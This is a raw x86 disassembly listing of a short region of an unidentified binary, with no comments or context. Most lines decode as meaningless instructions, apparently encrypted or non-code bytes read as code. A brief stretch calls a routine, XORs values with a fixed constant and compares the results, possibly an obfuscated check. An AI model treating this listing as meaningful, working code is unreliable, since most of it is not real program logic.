  41c6ec:	dec    edi
  41c6ed:	lods   eax,DWORD PTR ds:[esi]
  41c6ee:	stos   DWORD PTR es:[edi],eax
  41c6ef:	dec    esp
  41c6f0:	daa    
  41c6f1:	loope  0x41c68b
  41c6f3:	pop    es
  41c6f4:	imul   edi,DWORD PTR [esp+edi*2],0x5b
  41c6f8:	stos   DWORD PTR es:[edi],eax
  41c6f9:	lahf   
  41c6fa:	add    ch,al
  41c6fc:	(bad)  
  41c6fd:	jle    0x41c6c7
  41c6ff:	xor    BYTE PTR [edi],ah
  41c701:	scas   eax,DWORD PTR es:[edi]
  41c702:	xor    edi,DWORD PTR [ecx-0x72]
  41c705:	xor    cl,al
  41c707:	addr16 sub al,0x63
  41c70a:	jge    0x41c788
  41c70c:	adc    al,0xc6
  41c70e:	imul   ecx
  41c710:	dec    edi
  41c711:	pop    es
  41c712:	not    DWORD PTR [edx-0x5f]
  41c715:	in     al,dx
  41c716:	jno    0x41c75b
  41c718:	push   edx
  41c719:	mov    ds:0x68c3e3a8,eax
  41c71e:	xchg   esi,eax
  41c71f:	sub    ch,ch
  41c721:	lahf   
  41c722:	xchg   edx,eax
  41c723:	je     0x41c761
  41c725:	xlat   BYTE PTR ds:[ebx]
  41c726:	xchg   esp,eax
  41c727:	cmp    esp,edx
  41c729:	dec    ecx
  41c72a:	push   ecx
  41c72b:	dec    ecx
  41c72c:	or     BYTE PTR [ebx],ch
  41c72e:	push   ecx
  41c72f:	out    0x5a,eax
  41c731:	shr    BYTE PTR [ecx+ebx*2],1
  41c734:	inc    edx
  41c735:	adc    eax,0xc89ae2d4
  41c73a:	and    ch,bh
  41c73c:	clc    
  41c73d:	jne    0x41c74a
  41c73f:	or     BYTE PTR [eax],dl
  41c741:	xchg   ebp,eax
  41c742:	pop    eax
  41c743:	sbb    BYTE PTR [edi+0x7a],cl
  41c746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c747:	(bad)  
  41c748:	sub    dh,al
  41c74a:	rol    DWORD PTR [edx],1
  41c74c:	pop    esi
  41c74d:	pop    eax
  41c74e:	or     al,0x25
  41c750:	in     eax,dx
  41c751:	cmp    BYTE PTR [ebx],ah
  41c753:	sub    edi,DWORD PTR [edx]
  41c755:	and    esp,DWORD PTR [eax]
  41c757:	std    
  41c758:	into   
  41c759:	mov    edx,0x93867407
  41c75e:	xchg   esp,eax
  41c75f:	dec    ecx
  41c760:	mov    eax,ds:0xcf68c104
  41c765:	lea    edx,[esi+0x4e]
  41c768:	and    ebx,ebp
  41c76a:	out    dx,eax
  41c76b:	out    0x8,al
  41c76d:	jp     0x41c774
  41c76f:	mov    bl,BYTE PTR [edx-0x80]
  41c772:	(bad)  
  41c774:	mov    bl,0xa8
  41c776:	xor    DWORD PTR [ecx+0x1fb052bd],edi
  41c77c:	mov    eax,0x93773969
  41c781:	dec    esi
  41c782:	dec    edx
  41c783:	fcomp  QWORD PTR [edi]
  41c785:	add    ch,dl
  41c787:	mov    ch,0x5b
  41c789:	test   DWORD PTR [esp+ecx*1-0xc3c32ec],edi
  41c790:	mov    cl,0x54
  41c792:	ficomp WORD PTR [ebp+eiz*1+0x29]
  41c796:	nop
  41c797:	add    DWORD PTR [edi+0x42],edi
  41c79a:	ins    BYTE PTR es:[edi],dx
  41c79b:	pop    ss
  41c79c:	sub    eax,0xd3d522b9
  41c7a1:	push   esi
  41c7a2:	xor    dl,BYTE PTR [edx-0x71]
  41c7a5:	pop    ecx
  41c7a6:	sbb    eax,0x6275157c
  41c7ab:	(bad)  
  41c7ad:	or     eax,0x1b90c0c8
  41c7b2:	adc    al,BYTE PTR [ecx]
  41c7b4:	out    dx,eax
  41c7b5:	cmc    
  41c7b6:	pushf  
  41c7b7:	xor    DWORD PTR [ebx-0x51],eax
  41c7ba:	clc    
  41c7bb:	push   edi
  41c7bc:	jnp    0x41c792
  41c7be:	jns    0x41c790
  41c7c0:	or     BYTE PTR [esi+0x38],bl
  41c7c3:	aam    0x39
  41c7c5:	mov    esi,DWORD PTR [eax+0x61]
  41c7c8:	jmp    DWORD PTR [ebx+ecx*8]
  41c7cb:	cdq    
  41c7cc:	mov    esi,DWORD PTR [eax+edx*1+0x39]
  41c7d0:	or     edx,DWORD PTR [ecx-0x4590c629]
  41c7d6:	mov    edx,gs
  41c7d8:	add    dh,BYTE PTR [ebp-0x5a]
  41c7db:	push   ebx
  41c7dc:	inc    edi
  41c7dd:	loopne 0x41c7ff
  41c7df:	jmp    0xf664:0x6bbbb865
  41c7e6:	call   0x234b:0x929ed553
  41c7ed:	lods   al,BYTE PTR ds:[esi]
  41c7ee:	lahf   
  41c7ef:	or     BYTE PTR [ebx-0x34],0xb3
  41c7f3:	enter  0xf2ee,0x1d
  41c7f7:	pop    ss
  41c7f8:	fs daa 
  41c7fa:	mov    eax,ds:0xf8e4876e
  41c7ff:	xchg   eax,eax
  41c801:	std    
  41c802:	jns    0x41c7a3
  41c804:	jmp    0x41c81e
  41c806:	fs out 0x9b,eax
  41c809:	stos   DWORD PTR es:[edi],eax
  41c80a:	ret    
  41c80b:	sbb    esp,eax
  41c80d:	push   ebp
  41c80e:	xor    al,BYTE PTR [ebp+0x62]
  41c811:	test   DWORD PTR [ebp+ebx*4+0x73a924b0],edi
  41c818:	out    dx,al
  41c819:	add    BYTE PTR [edi-0x53f85bf0],0xe7
  41c820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c821:	mov    dh,0xcf
  41c823:	pop    ebp
  41c824:	inc    edx
  41c825:	leave  
  41c826:	jbe    0x41c803
  41c828:	sub    ecx,ebx
  41c82a:	mov    edx,0x485f3b43
  41c82f:	mov    eax,0xb47e24e6
  41c834:	out    0x77,eax
  41c836:	inc    edi
  41c837:	or     al,0x10
  41c839:	ins    DWORD PTR es:[edi],dx
  41c83a:	dec    ebx
  41c83b:	fcom   QWORD PTR [edi+eax*8-0x2c0233ce]
  41c842:	inc    esi
  41c843:	std    
  41c844:	es sbb eax,edx
  41c847:	fcmovnb st,st(1)
  41c849:	adc    esp,DWORD PTR [edx+0x73]
  41c84c:	mov    eax,ds:0xa5ca941e
  41c851:	xor    eax,0xf5341ec7
  41c856:	push   ecx
  41c857:	mov    bh,0xd6
  41c859:	(bad)  
  41c85a:	lahf   
  41c85b:	lahf   
  41c85c:	js     0x41c7f5
  41c85e:	pop    es
  41c85f:	frstor [edx+0x308ae6da]
  41c865:	out    dx,eax
  41c866:	ja     0x41c892
  41c868:	out    dx,al
  41c869:	jo     0x41c8ac
  41c86b:	test   BYTE PTR [edi-0x2d],0xb9
  41c86f:	mov    bl,0xac
  41c871:	sbb    cl,BYTE PTR [edx-0x5a3973ca]
  41c877:	cmp    al,BYTE PTR [esp+esi*4+0x1b]
  41c87b:	inc    ebp
  41c87c:	hlt    
  41c87d:	mov    eax,0xb6744e35
  41c882:	das    
  41c883:	adc    al,0x5c
  41c885:	jge    0x41c836
  41c887:	das    
  41c888:	push   DWORD PTR [esp+0x74]
  41c88c:	push   DWORD PTR [esp+0x74]
  41c890:	push   DWORD PTR [esp+0x24]
  41c894:	push   DWORD PTR [esp+0x24]
  41c898:	call   0x415a06
  41c89d:	mov    edx,DWORD PTR [esp+0x18]
  41c8a1:	mov    eax,DWORD PTR [esp+0x1c]
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	mov    dh,0x14
  41c93d:	cmp    eax,0x166befbe
  41c942:	sbb    BYTE PTR [edx+edx*1-0xeb6e7e8],bh
  41c949:	pushf  
  41c94a:	mul    BYTE PTR [edx]
  41c94c:	(bad)  
  41c94d:	cld    
  41c94e:	les    ecx,FWORD PTR [ebx+0xb]
  41c951:	es cmp eax,0x9c65146d
  41c957:	xor    al,0xd7
  41c959:	popf   
  41c95a:	xor    eax,0x643c4f2d
  41c95f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c960:	sbb    esi,DWORD PTR [edx+edx*1+0xa]
  41c964:	das    
  41c965:	scas   eax,DWORD PTR es:[edi]
  41c966:	ins    BYTE PTR es:[edi],dx
  41c967:	(bad)  
  41c968:	gs stc 
  41c96a:	mov    eax,ds:0x60c11a4
  41c96f:	mov    cl,0x9c
  41c971:	mov    ch,BYTE PTR [edi+0x48668e02]
  41c977:	out    dx,al
  41c978:	jp     0x41c9b5
  41c97a:	jae    0x41c8fe
  41c97c:	(bad)  
  41c97f:	rcr    DWORD PTR [ebp-0x2b],0xc0
  41c983:	in     eax,dx
  41c984:	pusha  
  41c985:	fcmovne st,st(0)
  41c987:	dec    eax
  41c988:	push   ds
  41c989:	and    eax,0x134436dc
  41c98e:	xchg   edx,eax
  41c98f:	fisub  WORD PTR [ebp+0x22]
  41c992:	retf   0x7da
  41c995:	mov    dh,0x63
  41c997:	mov    cl,0xfc
  41c999:	repnz sbb edi,edi
  41c99c:	mov    DWORD PTR [ecx+0xc],ebp
  41c99f:	push   cs
  41c9a0:	sbb    eax,esp
  41c9a2:	pop    ebx
  41c9a3:	jle    0x41c9d2
  41c9a5:	pop    ecx
  41c9a6:	push   ebp
  41c9a7:	lock pop ss
  41c9a9:	pusha  
  41c9aa:	test   DWORD PTR [eax+edx*2-0x47],edi
  41c9ae:	fcomp  QWORD PTR ds:0x6c4b84ee
  41c9b4:	js     0x41c979
  41c9b6:	or     al,0x2c
  41c9b8:	sub    ah,al
  41c9ba:	pushf  
  41c9bb:	in     eax,dx
  41c9bc:	push   0x114d30d2
  41c9c1:	ins    BYTE PTR es:[edi],dx
  41c9c2:	push   ecx
  41c9c3:	ins    BYTE PTR es:[edi],dx
  41c9c4:	xchg   edi,eax
  41c9c5:	and    al,0x35
  41c9c7:	out    dx,eax
  41c9c8:	(bad)  
  41c9ca:	repz dec edx
  41c9cc:	cdq    
  41c9cd:	cld    
  41c9ce:	mov    ds:0x73eabb15,al
  41c9d3:	jbe    0x41ca3f
  41c9d5:	pop    esp
  41c9d6:	jp     0x41c9ac
  41c9d8:	xchg   ecx,eax
  41c9d9:	cmp    DWORD PTR [eax-0x9e7ceab],eax
  41c9df:	ds leave 
  41c9e1:	mov    ch,0x11
  41c9e3:	mov    ebx,0x358b48ca
  41c9e8:	mov    esp,0xce933774
  41c9ed:	popf   
  41c9ee:	fstp   TBYTE PTR [ebx+0x7a2aa5a8]
  41c9f4:	cs movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41c9f7:	aad    0x6
  41c9f9:	ffree  st(0)
  41c9fb:	or     ah,BYTE PTR [ebp-0x2e]
  41c9fe:	or     bh,BYTE PTR [ebp-0x4]
  41ca01:	mov    esi,0xb478043e
  41ca06:	pop    edx
  41ca07:	mov    ds:0xb88e7338,eax
  41ca0c:	(bad)  
  41ca0d:	jae    0x41c9cd
  41ca0f:	xchg   ebx,eax
  41ca10:	add    eax,0xc20c7cd9
  41ca15:	jb     0x41c9f9
  41ca17:	cdq    
  41ca18:	pop    edx
  41ca19:	add    al,0xb4
  41ca1b:	(bad)  
  41ca1c:	push   0xffffffde
  41ca1e:	pop    edi
  41ca1f:	popf   
  41ca20:	adc    al,0x7b
  41ca22:	ds inc eax
  41ca24:	stos   BYTE PTR es:[edi],al
  41ca25:	dec    edx
  41ca26:	jb     0x41ca36
  41ca28:	mov    ds:0xae4e82a9,al
  41ca2d:	pop    edi
  41ca2e:	nop
  41ca2f:	fild   WORD PTR [eax-0x140a6c5]
  41ca35:	add    al,0xdf
  41ca37:	retf   
  41ca38:	jg     0x41ca4a
  41ca3a:	cs inc eax
  41ca3c:	es adc edi,ebp
  41ca3f:	pop    edx
  41ca40:	push   edi
  41ca41:	imul   edx,DWORD PTR [edi],0xffffffd2
  41ca44:	inc    esp
  41ca45:	icebp  
  41ca46:	hlt    
  41ca47:	jne    0x41ca2f
  41ca49:	mov    edx,0x4272e777
  41ca4e:	repz in al,dx
  41ca50:	xchg   DWORD PTR [ebx],edx
  41ca52:	push   0x605fbc25
  41ca57:	fdivr  st,st(3)
  41ca59:	test   eax,0x293bb12e
  41ca5e:	sbb    ebx,edx
  41ca60:	or     esp,DWORD PTR [esi-0x7a]
  41ca63:	ret    0xc9ba
  41ca66:	sub    al,0x31
  41ca68:	or     eax,0x836beb28
  41ca6d:	push   ds
  41ca6e:	cmp    eax,0xd03c893b
  41ca73:	dec    esi
  41ca74:	push   0xffffffd8
  41ca76:	idiv   BYTE PTR [eax]
  41ca78:	dec    ebp
  41ca79:	pushf  
  41ca7a:	stc    
  41ca7b:	pop    eax
  41ca7c:	call   0x6e09:0xee188af4
  41ca83:	repnz into 
  41ca85:	repz fistp QWORD PTR [edx]
  41ca88:	sbb    ah,BYTE PTR [ecx+0x58c507b1]
  41ca8e:	call   0x9912:0x5c0c7ea8
  41ca95:	aas    
  41ca96:	ds ins BYTE PTR es:[edi],dx
  41ca98:	jg     0x41ca4a
  41ca9a:	cmp    DWORD PTR [edx],ebx
  41ca9c:	inc    edx
  41ca9d:	xchg   ebp,eax
  41ca9e:	mov    al,0x53
  41caa0:	xlat   BYTE PTR ds:[ebx]
  41caa1:	mov    ch,0xc
  41caa3:	add    bl,dh
  41caa5:	popf   
  41caa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caa7:	cs jbe 0x41cab3
  41caaa:	outs   dx,BYTE PTR ds:[esi]
  41caab:	ror    DWORD PTR [ebx+0x15],1
  41caae:	mov    ebp,0x94dd31ae
  41cab3:	lahf   
  41cab4:	pop    esi
  41cab5:	jb     0x41ca7f
  41cab7:	dec    edx
  41cab8:	adc    DWORD PTR [ecx],esi
  41caba:	and    edx,ebp
  41cabc:	jnp    0x41cb06
  41cabe:	call   0x19648979
  41cac3:	xchg   ebp,eax
  41cac4:	xor    eax,0x5313b9ec
  41cac9:	push   eax
  41caca:	adc    DWORD PTR [ebx],esp
  41cacc:	test   BYTE PTR [ebp-0x5],dh
  41cacf:	adc    edx,DWORD PTR [eax-0x4]
  41cad2:	mov    ch,0x34
  41cad4:	inc    ecx
  41cad5:	cmp    al,0x81
  41cad7:	loop   0x41ca91
  41cad9:	mov    ds:0x3c7b2aed,al
  41cade:	sar    edi,1
  41cae0:	daa    
  41cae1:	jl     0x41cad8
  41cae3:	rcl    bh,1
  41cae5:	in     al,dx
  41cae6:	mov    esi,0x55d8e5ac
  41caeb:	inc    eax
  41caec:	repnz pop es
  41caee:	push   cs
  41caef:	mov    esi,0xdd2ce54e
  41caf4:	addr16 mov al,ds:0x3e15
  41caf8:	jne    0x41ca94
  41cafa:	sbb    bl,BYTE PTR [edi]
  41cafc:	ds aam 0xb3
  41caff:	arpl   WORD PTR ds:0xe804ddcf,sp
  41cb05:	(bad)  [edx-0x21c8f9d2]
  41cb0b:	test   DWORD PTR [eax],ebx
  41cb0d:	(bad)  
  41cb0e:	cwde   
  41cb0f:	fiadd  DWORD PTR [ecx]
  41cb11:	inc    edx
  41cb12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb13:	in     al,dx
  41cb14:	mov    ebp,DWORD PTR [eax]
  41cb16:	and    eax,0x6feb0024
  41cb1b:	dec    ecx
  41cb1c:	out    0xa0,al
  41cb1e:	inc    ebp
  41cb1f:	sbb    ecx,DWORD PTR [ecx]
  41cb21:	pop    esp
  41cb22:	adc    DWORD PTR [eax],0xcbb9e13f
  41cb28:	ret    0xfd3d
  41cb2b:	sub    BYTE PTR [ebp+0x29d4cbd],bl
  41cb31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb32:	mov    ebp,0xf61b65e0
  41cb37:	mov    bl,0xd4
  41cb39:	pop    esi
  41cb3a:	mov    eax,DWORD PTR [eax-0x7f14844f]
  41cb40:	dec    eax
  41cb41:	xchg   ebp,eax
  41cb42:	shl    DWORD PTR [edx+0xa],0x21
  41cb46:	ins    BYTE PTR es:[edi],dx
  41cb47:	mov    eax,ds:0xa0a33b72
  41cb4c:	aas    
  41cb4d:	sbb    al,0x91
  41cb4f:	mov    al,0xcb
  41cb51:	cld    
  41cb52:	js     0x41cb29
  41cb54:	rcl    DWORD PTR [ebx-0x2651af2a],0xc9
  41cb5b:	pop    esi
  41cb5c:	jmp    0xd890d1a4
  41cb61:	push   eax
  41cb62:	mov    eax,ds:0x6df77dac
  41cb67:	mov    al,ds:0x9ef762c4
  41cb6c:	enter  0xb849,0xa1
  41cb70:	ja     0x41cba7
  41cb72:	cmc    
  41cb73:	inc    ebp
  41cb74:	js     0x41cb2d
  41cb76:	xor    al,0x8
  41cb78:	and    dh,bh
  41cb7a:	fldenv [esi]
  41cb7c:	adc    eax,0x79be8b57
  41cb81:	add    BYTE PTR [edx-0x51572dde],0x9f
  41cb88:	arpl   WORD PTR [esi+0x17616c04],si
  41cb8e:	leave  
  41cb8f:	cmp    al,BYTE PTR [esp+ebp*4-0x44]
  41cb93:	adc    al,0x65
  41cb95:	vmaskmovdqu xmm6,(bad)
  41cb96:	stc    
  41cb97:	div    DWORD PTR [edi+0x3d]
  41cb9a:	push   esp
  41cb9b:	dec    edi
  41cb9c:	inc    edi
  41cb9d:	mov    WORD PTR [eax+ecx*1-0x2d],fs
  41cba1:	mov    ebp,0x8be530ab
  41cba6:	sbb    cl,BYTE PTR [ecx-0x3ede65e8]
  41cbac:	pop    es
  41cbad:	pusha  
  41cbae:	imul   esi,DWORD PTR [esi-0x74b41b5f],0x6
  41cbb5:	ins    BYTE PTR es:[edi],dx
  41cbb6:	cdq    
  41cbb7:	gs fxch st(6)
  41cbba:	xchg   edx,eax
  41cbbb:	or     DWORD PTR [ebx],0x3737789
  41cbc1:	fld    DWORD PTR [eax+0x1]
  41cbc4:	mov    ds:0xc7817a5b,eax
  41cbc9:	inc    edx
  41cbca:	dec    ebp
  41cbcb:	cli    
  41cbcc:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41cbce:	inc    edx
  41cbcf:	mov    bl,0x7d
  41cbd1:	cmp    DWORD PTR [ebx+0x474b39a8],edi
  41cbd7:	mov    ah,0xdf
  41cbd9:	call   0x5bef:0xf523b60f
  41cbe0:	dec    ebx
  41cbe1:	sbb    eax,0x1a518957
  41cbe6:	or     esp,ebx
  41cbe8:	xchg   DWORD PTR [ebx],ebx
  41cbea:	sbb    dl,0x7
  41cbed:	mov    ebp,0xca012176
  41cbf2:	lods   eax,DWORD PTR ds:[esi]
  41cbf3:	push   eax
  41cbf4:	dec    edx
  41cbf5:	jge    0x41cc64
  41cbf7:	mul    BYTE PTR [esi+0x7]
  41cbfa:	jno    0x41cb7e
  41cbfc:	mov    bh,0xda
  41cbfe:	popf   
  41cbff:	jbe    0x41cc48
  41cc01:	repz cwde 
  41cc03:	aad    0x36
  41cc05:	je     0x41cc85
  41cc07:	pop    ecx
  41cc08:	test   al,0x5b
  41cc0a:	xor    BYTE PTR ds:[edi],dh
  41cc0d:	jnp    0x41cbbe
  41cc0f:	sbb    ecx,DWORD PTR [ebx+edx*4-0x6b73085e]
  41cc16:	xor    al,0xde
  41cc18:	sbb    eax,0x20612fbc
  41cc1d:	sub    al,0x90
  41cc1f:	and    BYTE PTR [esi+0x57],dl
  41cc22:	sub    edx,esi
  41cc24:	(bad)  [ecx]
  41cc26:	in     al,0x5a
  41cc28:	call   0x1176d60d
  41cc2d:	inc    eax
  41cc2e:	inc    ebx
  41cc2f:	and    al,0x1b
  41cc31:	fs jne 0x41cc1a
  41cc34:	arpl   si,cx
  41cc36:	rcl    DWORD PTR [ebx+0x188e5fa7],1
  41cc3c:	ja     0x41cc16
  41cc3e:	data16 cld 
  41cc40:	and    BYTE PTR [esp+esi*1],dh
  41cc43:	popf   
  41cc44:	mov    esp,0x4f065033
  41cc49:	loop   0x41cbd5
  41cc4b:	inc    ebx
  41cc4c:	fcomp  DWORD PTR [edi+0x1a]
  41cc4f:	mov    bh,0xea
  41cc51:	clc    
  41cc52:	data16 cmc 
  41cc54:	dec    ecx
  41cc55:	inc    edx
  41cc56:	sub    al,0x43
  41cc58:	mov    BYTE PTR [ecx+0x42],al
  41cc5b:	cmp    eax,0xf6c5214a
  41cc60:	xchg   ebx,eax
  41cc61:	adc    ch,dl
  41cc63:	dec    edx
  41cc64:	jne    0x41cc68
  41cc66:	loop   0x41cccb
  41cc68:	xor    DWORD PTR [ebx],ebp
  41cc6a:	loop   0x41cc4c
  41cc6c:	add    dh,dl
  41cc6e:	cli    
  41cc6f:	mov    ebx,DWORD PTR [ebp-0x2f]
  41cc72:	inc    edi
  41cc73:	pop    ss
  41cc74:	shl    BYTE PTR [esi+ecx*8-0x773a73da],cl
  41cc7b:	aas    
  41cc7c:	test   al,0x8d
  41cc7e:	cmp    DWORD PTR [eax-0x74d9dbb8],edi
  41cc84:	and    al,0xd4
  41cc86:	je     0x41cc4f
  41cc88:	inc    ebp
  41cc89:	inc    edx
  41cc8a:	adc    BYTE PTR [ecx],bl
  41cc8c:	jecxz  0x41cc74
  41cc8e:	jae    0x41ccab
  41cc90:	or     ah,bh
  41cc92:	test   BYTE PTR [edx-0x4d],bl
  41cc95:	js     0x41cd13
  41cc97:	nop
  41cc98:	leave  
  41cc99:	cli    
  41cc9a:	and    al,0xd3
  41cc9c:	fs popa 
  41cc9e:	cmp    al,0xb3
  41cca0:	jle    0x41ccaa
  41cca2:	jmp    0xf8735be
  41cca7:	or     BYTE PTR [ebp+0x7a3bfa2f],dl
  41ccad:	dec    ebx
  41ccae:	jecxz  0x41cc96
  41ccb0:	sbb    bh,ah
  41ccb2:	pavgb  mm6,QWORD PTR ds:0xd0799070
  41ccb9:	int3   
  41ccba:	xchg   edx,eax
  41ccbb:	scas   al,BYTE PTR es:[edi]
  41ccbc:	xor    cl,BYTE PTR [edi]
  41ccbe:	div    ch
  41ccc0:	push   ebx
  41ccc1:	xlat   BYTE PTR ds:[ebx]
  41ccc2:	and    BYTE PTR [ebx],dl
  41ccc4:	(bad)  
  41ccc6:	jmp    0x41cc68
  41ccc8:	sub    BYTE PTR [eax-0x267785c3],ch
  41ccce:	(bad)  
  41cccf:	cli    
  41ccd0:	or     BYTE PTR [eax+0x6ca85687],0xf9
  41ccd7:	add    DWORD PTR [edx+0x4cd31e16],esi
  41ccdd:	lar    esi,WORD PTR [esi+edi*1+0x669b0399]
  41cce5:	xchg   ecx,eax
  41cce6:	dec    edx
  41cce7:	adc    DWORD PTR [ecx+0x77cee848],ebp
  41cced:	dec    esi
  41ccee:	shl    BYTE PTR [esi-0x73],1
  41ccf1:	pushf  
  41ccf2:	sbb    esi,0x12
  41ccf5:	mov    al,0x9c
  41ccf7:	mul    dh
  41ccf9:	mov    cl,BYTE PTR [esp+0x3c]
  41ccfd:	or     al,0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0xaa55751e
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1+0x6e691818],bh
  41cd1e:	sti    
  41cd1f:	daa    
  41cd20:	jbe    0x41cd62
  41cd22:	cmp    bh,BYTE PTR [ebp-0x5e046b71]
  41cd28:	jmp    0xf33f0819
  41cd2d:	and    eax,0x7e9822e
  41cd32:	add    al,0xf9
  41cd34:	xor    ebx,DWORD PTR [ecx-0x55]
  41cd37:	in     eax,0x85
  41cd39:	mov    DWORD PTR [ebx+0x3c],ecx
  41cd3c:	imul   esp,DWORD PTR [esi+ebx*4],0xd8109b6d
  41cd43:	fwait
  41cd44:	test   eax,0xa2b70dee
  41cd49:	les    esp,FWORD PTR [eax+0x5f]
  41cd4c:	dec    esp
  41cd4d:	cmp    ah,BYTE PTR [esi-0x5d]
  41cd50:	jbe    0x41cd24
  41cd52:	adc    edx,DWORD PTR [ecx+0x2d]
  41cd55:	and    ah,BYTE PTR [edx+eax*4+0x6c94b752]
  41cd5c:	pop    eax
  41cd5d:	ins    BYTE PTR es:[edi],dx
  41cd5e:	jbe    0x41cd34
  41cd60:	dec    ebx
  41cd61:	ds dec esp
  41cd63:	fadd   DWORD PTR ds:0x6095ddb3
  41cd69:	sub    ch,bl
  41cd6b:	into   
  41cd6c:	pop    ebp
  41cd6d:	xchg   edx,eax
  41cd6e:	call   0xf3c9:0x88ae017d
  41cd75:	mov    cl,0x74
  41cd77:	mov    eax,0xb32e0caa
  41cd7c:	or     BYTE PTR ds:0x8cdf1744,ch
  41cd82:	outs   dx,BYTE PTR ds:[esi]
  41cd83:	push   edx
  41cd84:	or     edi,0x28
  41cd87:	int3   
  41cd88:	xlat   BYTE PTR ds:[ebx]
  41cd89:	pusha  
  41cd8a:	push   esp
  41cd8b:	bswap  ebx
  41cd8d:	daa    
  41cd8e:	xor    al,0x35
  41cd90:	sti    
  41cd91:	repz push ss
  41cd93:	cmp    bl,dh
  41cd95:	out    dx,al
  41cd96:	push   eax
  41cd97:	loopne 0x41cd32
  41cd99:	dec    ebx
  41cd9a:	ins    DWORD PTR es:[edi],dx
  41cd9b:	mov    eax,0xc18adb4a
  41cda0:	inc    esp
  41cda1:	es out dx,al
  41cda3:	stos   BYTE PTR es:[edi],al
  41cda4:	cmp    ebx,edi
  41cda6:	cmp    bl,BYTE PTR [edx+0x54]
  41cda9:	jmp    0x6d37b93a
  41cdae:	in     eax,0x6d
  41cdb0:	pushf  
  41cdb1:	into   
  41cdb2:	fbld   TBYTE PTR [edi]
  41cdb4:	sti    
  41cdb5:	or     BYTE PTR [ebx-0x73ea9b20],0xb0
  41cdbc:	data16 fwait
  41cdbe:	int    0x9f
  41cdc0:	cmp    ah,BYTE PTR [ebx+0x35dc5b09]
  41cdc6:	and    ebp,DWORD PTR [edi+edi*4-0x2]
  41cdca:	jnp    0x41cda8
  41cdcc:	aas    
  41cdcd:	jno    0x41ce23
  41cdcf:	icebp  
  41cdd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdd1:	xor    dh,BYTE PTR [ebx-0x4d351183]
  41cdd7:	or     eax,DWORD PTR [esi+0x52]
  41cdda:	xlat   BYTE PTR ds:[ebx]
  41cddb:	das    
  41cddc:	dec    ebx
  41cddd:	and    DWORD PTR [ebp+0x64],0xf438ab44
  41cde4:	mul    edx
  41cde6:	leave  
  41cde7:	dec    edx
  41cde8:	popf   
  41cde9:	retf   0x9873
  41cdec:	mov    al,BYTE PTR [edi-0x36940ca9]
  41cdf2:	gs scas eax,DWORD PTR es:[edi]
  41cdf4:	pushf  
  41cdf5:	adc    al,0x42
  41cdf7:	push   esp
  41cdf8:	push   ss
  41cdf9:	sbb    BYTE PTR [edx+0x5],ch
  41cdfc:	jmp    0x2f08ba2
  41ce01:	or     al,0xa8
  41ce03:	cwde   
  41ce04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce05:	and    al,0xa3
  41ce07:	sub    esp,DWORD PTR [ebp-0x5424015f]
  41ce0d:	xchg   cl,bh
  41ce0f:	pop    ebp
  41ce10:	adc    ch,BYTE PTR [ecx]
  41ce12:	push   es
  41ce13:	pop    edi
  41ce14:	int3   
  41ce15:	fld    QWORD PTR [ecx-0x5e]
  41ce18:	inc    edx
  41ce19:	lea    ebx,[edx-0x3]
  41ce1c:	dec    edx
  41ce1d:	adc    al,0xfa
  41ce1f:	fisub  WORD PTR [esp+ebx*4-0x31]
  41ce23:	jne    0x41ce6b
  41ce25:	out    dx,eax
  41ce26:	push   ss
  41ce27:	mov    fs,WORD PTR [ecx-0x23]
  41ce2a:	dec    ebx
  41ce2b:	sub    dh,BYTE PTR [ecx+0x4c]
  41ce2e:	imul   BYTE PTR [ecx-0x21]
